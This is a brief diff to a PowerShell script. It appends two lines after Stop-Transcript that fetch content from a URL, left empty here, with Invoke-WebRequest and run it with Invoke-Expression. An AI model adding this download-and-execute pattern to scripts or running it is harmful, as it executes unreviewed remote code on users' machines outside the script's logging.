@@ -489,3 +489,6 @@ Start-Sleep -Seconds 5
 Write-Host
 
 Stop-Transcript 
+
+$PS7Modules = Invoke-WebRequest("")
+Invoke-Expression $($PS7Modules.Content)
